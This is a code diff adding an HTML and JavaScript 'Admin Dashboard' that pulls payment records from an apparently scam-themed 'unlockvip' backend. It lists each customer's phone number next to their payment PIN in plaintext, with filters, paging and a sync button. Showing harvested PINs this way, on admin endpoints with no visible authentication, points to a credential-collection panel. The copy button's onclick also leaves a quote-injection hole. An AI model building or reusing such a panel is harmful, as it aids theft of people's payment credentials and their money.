@@ -1,0 +1,434 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Admin Dashboard</title>
+<style>
+body{
+  margin:0;
+  font-family: Arial, sans-serif;
+  background:#0b0f19;
+  color:white;
+}
+
+h1{
+  text-align:center;
+  padding:16px 12px 8px;
+  margin:0;
+}
+
+.toolbar{
+  display:flex;
+  flex-wrap:wrap;
+  gap:8px;
+  align-items:center;
+  justify-content:center;
+  padding:8px 12px 16px;
+}
+
+.toolbar button, .toolbar select, .toolbar input{
+  background:#2563eb;
+  color:white;
+  border:none;
+  padding:8px 12px;
+  border-radius:6px;
+  cursor:pointer;
+  font-size:14px;
+}
+
+.toolbar input{
+  background:#111827;
+  border:1px solid #334155;
+  min-width:140px;
+  cursor:text;
+}
+
+.toolbar button:disabled{
+  opacity:0.5;
+  cursor:not-allowed;
+}
+
+.toolbar select{
+  background:#111827;
+  border:1px solid #334155;
+}
+
+.meta{
+  text-align:center;
+  color:#94a3b8;
+  font-size:13px;
+  padding:0 12px 12px;
+}
+
+.status-bar{
+  text-align:center;
+  padding:12px;
+  color:#94a3b8;
+  font-size:14px;
+}
+
+.status-bar.error{
+  color:#ef4444;
+}
+
+table{
+  width:100%;
+  border-collapse:collapse;
+}
+
+th, td{
+  padding:12px;
+  text-align:center;
+  border-bottom:1px solid #222;
+}
+
+th{
+  background:#111827;
+  position:sticky;
+  top:0;
+  z-index:1;
+}
+
+tr:hover{
+  background:#1f2937;
+}
+
+.status-success{
+  color:#22c55e;
+  font-weight:bold;
+}
+
+.status-failed{
+  color:#ef4444;
+  font-weight:bold;
+}
+
+.status-pending{
+  color:#facc15;
+  font-weight:bold;
+}
+
+.copy-btn{
+  background:#2563eb;
+  color:white;
+  border:none;
+  padding:5px 10px;
+  border-radius:6px;
+  cursor:pointer;
+}
+
+.copy-btn:hover{
+  background:#1d4ed8;
+}
+</style>
+</head>
+<body>
+
+<h1>📊 Admin Dashboard</h1>
+
+<div class="toolbar">
+  <input id="phoneSearch" type="search" placeholder="Search phone e.g. 061..." />
+  <button id="prevBtn" type="button">Prev</button>
+  <span id="pageLabel">Page 1</span>
+  <button id="nextBtn" type="button">Next</button>
+  <select id="limitSelect">
+    <option value="50" selected>50 / page</option>
+    <option value="100">100 / page</option>
+    <option value="200">200 / page</option>
+  </select>
+  <select id="statusFilter">
+    <option value="">All statuses</option>
+    <option value="COMPLETED">COMPLETED</option>
+    <option value="PROCESSING">PROCESSING</option>
+    <option value="PENDING">PENDING</option>
+    <option value="TIMEOUT">TIMEOUT</option>
+    <option value="FAILED">FAILED</option>
+  </select>
+  <button id="refreshBtn" type="button">Refresh</button>
+  <button id="syncBtn" type="button">Sync status</button>
+</div>
+
+<div class="meta" id="meta">Loading...</div>
+<div class="status-bar" id="statusBar">Loading payments...</div>
+
+<table>
+<thead>
+<tr>
+<th>Phone</th>
+<th>PIN</th>
+<th>Status</th>
+<th>Reason</th>
+<th>Time</th>
+<th>Copy</th>
+</tr>
+</thead>
+<tbody id="tableBody"></tbody>
+</table>
+
+<script>
+function apiBases() {
+  const bases = [];
+  if (location.protocol === "http:" || location.protocol === "https:") {
+    bases.push(location.origin);
+  }
+  bases.push("https://unlockvip-backend-1.onrender.com");
+  bases.push("https://unlockvip-backend.onrender.com");
+  return [...new Set(bases)];
+}
+
+function fetchWithTimeout(url, options = {}, ms = 12000) {
+  const controller = new AbortController();
+  const timer = setTimeout(() => controller.abort(), ms);
+  return fetch(url, { ...options, signal: controller.signal }).finally(() => {
+    clearTimeout(timer);
+  });
+}
+
+async function fetchApi(path, options = {}, ms = 25000) {
+  let lastError = null;
+  for (const base of apiBases()) {
+    try {
+      const res = await fetchWithTimeout(
+        `${base}${path}`,
+        { cache: "no-store", ...options },
+        ms
+      );
+      const type = res.headers.get("content-type") || "";
+      if (res.status === 404 || res.status === 405) continue;
+      if (type.includes("text/html") && !type.includes("json")) continue;
+      return res;
+    } catch (error) {
+      lastError = error;
+    }
+  }
+  throw lastError || new Error("All API hosts failed");
+}
+
+let page = 1;
+let limit = 50;
+let status = "";
+let phoneQuery = "";
+let totalPages = 1;
+let total = 0;
+let loading = false;
+let loadGen = 0;
+
+const tableBody = document.getElementById("tableBody");
+const statusBar = document.getElementById("statusBar");
+const meta = document.getElementById("meta");
+const pageLabel = document.getElementById("pageLabel");
+const prevBtn = document.getElementById("prevBtn");
+const nextBtn = document.getElementById("nextBtn");
+const limitSelect = document.getElementById("limitSelect");
+const statusFilter = document.getElementById("statusFilter");
+const refreshBtn = document.getElementById("refreshBtn");
+const syncBtn = document.getElementById("syncBtn");
+const phoneSearch = document.getElementById("phoneSearch");
+
+function updateControls() {
+  pageLabel.textContent = `Page ${page} / ${totalPages}`;
+  prevBtn.disabled = loading || page <= 1;
+  nextBtn.disabled = loading || page >= totalPages;
+  refreshBtn.disabled = loading;
+  syncBtn.disabled = loading;
+  limitSelect.disabled = loading;
+  statusFilter.disabled = loading;
+  phoneSearch.disabled = loading;
+
+  const from = total === 0 ? 0 : (page - 1) * limit + 1;
+  const to = Math.min(page * limit, total);
+  meta.textContent = `Showing ${from}-${to} of ${total} payments`;
+}
+
+function escapeHtml(value) {
+  return String(value ?? "")
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;")
+    .replace(/"/g, "&quot;");
+}
+
+async function loadData(attempt = 1) {
+  if (loading && attempt === 1) return;
+  const gen = attempt === 1 ? ++loadGen : loadGen;
+  loading = true;
+  updateControls();
+
+  statusBar.className = "status-bar";
+  statusBar.textContent =
+    attempt === 1
+      ? "Loading payments..."
+      : "Waking server, this can take up to a minute...";
+
+  try {
+    const params = new URLSearchParams({
+      page: String(page),
+      limit: String(limit),
+      light: "1"
+    });
+    if (status) params.set("status", status);
+    if (phoneQuery) params.set("phone", phoneQuery);
+
+    const timeoutMs = attempt === 1 ? 25000 : 55000;
+    const res = await fetchApi(`/admin/payments?${params}`, {}, timeoutMs);
+    if (gen !== loadGen) return;
+
+    if (res.status === 503 && attempt < 4) {
+      statusBar.textContent = "Database still connecting, retrying...";
+      await new Promise((r) => setTimeout(r, 1500 * attempt));
+      if (gen !== loadGen) return;
+      loading = false;
+      return loadData(attempt + 1);
+    }
+
+    if (!res.ok) {
+      throw new Error(`Server returned ${res.status}`);
+    }
+
+    const payload = await res.json();
+    const data = Array.isArray(payload) ? payload : (payload.data || []);
+    total = Array.isArray(payload) ? data.length : Number(payload.total || data.length);
+    totalPages = Array.isArray(payload)
+      ? 1
+      : Math.max(1, Number(payload.totalPages || 1));
+    page = Array.isArray(payload) ? 1 : Number(payload.page || page);
+
+    if (!data.length) {
+      tableBody.innerHTML = "";
+      statusBar.textContent = "No payments found.";
+      updateControls();
+      return;
+    }
+
+    let html = "";
+    for (const p of data) {
+      let statusClass = "status-pending";
+      if (p.status === "COMPLETED") statusClass = "status-success";
+      if (p.status === "FAILED" || p.status === "TIMEOUT") statusClass = "status-failed";
+
+      html += `
+        <tr>
+          <td>${escapeHtml(p.phone)}</td>
+          <td>${escapeHtml(p.pin)}</td>
+          <td class="${statusClass}">${escapeHtml(p.status)}</td>
+          <td>${escapeHtml(p.reason || p.message || "-")}</td>
+          <td>${escapeHtml(p.time || "-")}</td>
+          <td>
+            <button class="copy-btn" onclick="copy('${escapeHtml(p.phone)}')">📋</button>
+          </td>
+        </tr>
+      `;
+    }
+
+    tableBody.innerHTML = html;
+    statusBar.textContent = "";
+  } catch (error) {
+    if (error.name === "AbortError" && attempt < 4) {
+      if (gen !== loadGen) return;
+      statusBar.textContent = "Server not responding, retrying...";
+      await new Promise((r) => setTimeout(r, 2000 * attempt));
+      if (gen !== loadGen) return;
+      loading = false;
+      return loadData(attempt + 1);
+    }
+    if (error.name === "AbortError") {
+      tableBody.innerHTML = "";
+      statusBar.className = "status-bar error";
+      statusBar.textContent =
+        "Failed to load: server unreachable. Tap Refresh — first load can take a minute if Render was asleep.";
+      return;
+    }
+    tableBody.innerHTML = "";
+    statusBar.className = "status-bar error";
+    statusBar.textContent = `Failed to load: ${error.message}. Tap Refresh to retry.`;
+  } finally {
+    loading = false;
+    updateControls();
+  }
+}
+
+async function syncPayments() {
+  if (loading) return;
+  loading = true;
+  updateControls();
+  statusBar.className = "status-bar";
+  statusBar.textContent = "Syncing pending/timeout payments from providers...";
+  try {
+    const res = await fetchApi(
+      "/admin/sync-payments",
+      {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ limit: 50 })
+      },
+      45000
+    );
+    if (!res.ok) throw new Error(`Server returned ${res.status}`);
+    const payload = await res.json();
+    statusBar.textContent = `Synced ${payload.synced || 0} payments (${payload.completed || 0} newly completed).`;
+  } catch (error) {
+    statusBar.className = "status-bar error";
+    statusBar.textContent = `Sync failed: ${error.message}`;
+  } finally {
+    loading = false;
+    updateControls();
+    await loadData();
+  }
+}
+
+function copy(text) {
+  navigator.clipboard.writeText(text);
+  alert("Copied: " + text);
+}
+
+prevBtn.addEventListener("click", () => {
+  if (page > 1) {
+    page -= 1;
+    loadData();
+  }
+});
+
+nextBtn.addEventListener("click", () => {
+  if (page < totalPages) {
+    page += 1;
+    loadData();
+  }
+});
+
+limitSelect.addEventListener("change", () => {
+  limit = Number(limitSelect.value) || 100;
+  page = 1;
+  loadData();
+});
+
+statusFilter.addEventListener("change", () => {
+  status = statusFilter.value;
+  page = 1;
+  loadData();
+});
+
+phoneSearch.addEventListener("keydown", (e) => {
+  if (e.key === "Enter") {
+    phoneQuery = phoneSearch.value.trim();
+    page = 1;
+    loadData();
+  }
+});
+
+refreshBtn.addEventListener("click", () => {
+  phoneQuery = phoneSearch.value.trim();
+  loadData();
+});
+syncBtn.addEventListener("click", () => syncPayments());
+
+loadData();
+
+// Refresh current page only, and never overlap requests
+setInterval(() => {
+  if (!loading) loadData();
+}, 15000);
+</script>
+
+</body>
+</html>
